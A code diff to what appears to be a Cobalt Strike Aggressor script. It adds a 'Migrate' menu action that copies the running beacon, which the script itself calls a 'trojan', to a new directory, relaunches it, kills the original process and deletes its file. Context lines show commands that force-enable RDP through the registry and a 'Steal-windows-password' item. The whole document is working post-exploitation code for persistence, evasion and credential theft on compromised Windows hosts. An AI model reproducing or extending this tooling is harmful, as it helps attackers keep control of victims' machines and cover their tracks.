@@ -71,6 +71,20 @@ sub Open_rdp{
    brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1");
    brun($1, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
 }
+
+sub Migrate{
+    $dir = $3['dir'];
+    $process = $3['pname'];
+    $current_pro = beacon_info($bid, "process");
+    $pid = beacon_info($bid, "pid");
+    $keep = $3['keep'];
+    $cmd = "mkdir ".$dir." || copy /y ".$current_pro."  ".$dir.$process." && start ".$dir.$process." && taskkill /F /PID ".$pid." && del /F ".$current_pro;
+    if ($keep eq "true"){
+        $cmd = "mkdir ".$dir." || copy /y ".$current_pro."  ".$dir.$process." && start ".$dir.$process;
+    }
+    bshell!($bid,$cmd);
+    btask($bid, "migrating process location to ".$dir.$process.", please wait new session !", "");
+}
 #append menus
 
 
@@ -130,5 +144,20 @@ sub Open_rdp{
 
             item "Steal-windows-password"{
                 Steal_windows_password($1);
+            }
+
+
+            item "Migrate"{
+                local('$process');
+                $bid = $1['@'];
+                $process = Getname();
+                $dir = Getinfo()[1];
+                $dialog = dialog("Migrate process",%(bid => $bid, dir => $dir, pname => $process, keep => "true"), &Migrate);
+                dialog_description($dialog, "Migrate your trojan to another directory and then reconnect a new session, only native sessions are supported and can only be migrated once");
+                drow_text($dialog, "dir", "Migrate directory: ");
+                drow_text($dialog, "pname", "Process name: ");
+                drow_checkbox($dialog, "keep", "Keep old connection: ", "");
+                dbutton_action($dialog, "Exec");
+                dialog_show($dialog);
             }
     }
